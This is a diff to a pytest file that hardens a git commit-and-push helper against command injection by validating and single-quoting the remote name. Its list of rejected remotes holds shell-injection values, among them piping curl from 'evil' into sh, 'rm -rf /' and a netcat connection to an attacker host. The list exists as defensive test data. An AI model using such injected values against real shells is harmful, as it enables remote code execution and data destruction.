@@ -17,6 +17,8 @@ from __future__ import annotations
 
 import re
 
+import pytest
+
 from modules.tools.discovery.canvas_git import (
     CommitContext,
     build_authenticated_remote,
@@ -102,7 +104,8 @@ def test_plan_commit_push_uses_canvas_branch_and_reuses_git_verbs():
     assert ops == ["checkout", "add", "commit", "push"]
     # branch-per-session on both the checkout and the push
     assert "canvas/canvas_abc123" in steps[0].args
-    assert "-u origin" in steps[-1].args
+    # remote is single-quoted (command-injection hardening)
+    assert "-u 'origin'" in steps[-1].args
     assert "canvas/canvas_abc123" in steps[-1].args
 
 
@@ -119,6 +122,60 @@ def test_plan_commit_push_never_contains_token_material():
     blob = " ".join(f"{s.operation} {s.args}" for s in steps)
     assert re.search(r"gh[posu]_[A-Za-z0-9]{20,}", blob) is None
     assert "@github.com" not in blob  # no authed remote in the plan
+
+
+# ---------------------------------------------------------------------------
+# Command-injection: the git remote is validated + single-quoted (SECURITY)
+# ---------------------------------------------------------------------------
+# The worker runs `git push {args}` as a SHELL string; an unquoted, caller-
+# supplied remote would be injection. Two gates: allowlist validation raises on
+# metacharacters, and the emitted push arg single-quotes the remote regardless.
+_MALICIOUS_REMOTES = [
+    "origin; curl evil|sh #",
+    "origin && rm -rf /",
+    "origin`whoami`",
+    "$(touch /tmp/pwned)",
+    "origin | nc attacker 4444",
+    "a remote with spaces",
+    'origin"; echo hi; "',
+]
+
+
+@pytest.mark.parametrize("bad", _MALICIOUS_REMOTES)
+def test_plan_commit_push_rejects_malicious_remote(bad):
+    # Gate 1: allowlist validation rejects a metacharacter-bearing remote.
+    with pytest.raises(ValueError):
+        plan_commit_push("s1", "feat: x", remote=bad)
+
+
+def test_plan_commit_push_push_arg_single_quotes_remote():
+    # Gate 2 (defense in depth): a benign remote is single-quoted in the push
+    # arg — never bare — so even a quoting-only regression stays safe.
+    steps = plan_commit_push("s1", "feat: x", remote="upstream")
+    push = next(s for s in steps if s.operation == "push")
+    assert "-u 'upstream'" in push.args
+    # And the branch is quoted too.
+    assert "'canvas/s1'" in push.args
+
+
+def test_plan_commit_push_accepts_url_and_name_remotes():
+    for good in ("origin", "upstream", "https://github.com/o/r.git", "git@github.com:o/r.git"):
+        steps = plan_commit_push("s1", "feat: x", remote=good)
+        push = next(s for s in steps if s.operation == "push")
+        # single-quoted, and the exact value preserved inside the quotes.
+        assert f"-u '{good}'" in push.args
+
+
+def test_no_metachar_remote_survives_unquoted_in_any_step():
+    # Belt-and-braces: for a benign remote, NO push arg contains a bare
+    # shell metacharacter outside the single-quoted spans.
+    steps = plan_commit_push("s1", "feat: x", remote="origin")
+    for s in steps:
+        # strip single-quoted spans, then assert no metacharacters remain
+        stripped = re.sub(r"'[^']*'", "", s.args)
+        assert not re.search(r"[;&|`$()<>]", stripped), (
+            f"bare metacharacter in {s.operation} args: {s.args!r}"
+        )
 
 
 # ---------------------------------------------------------------------------
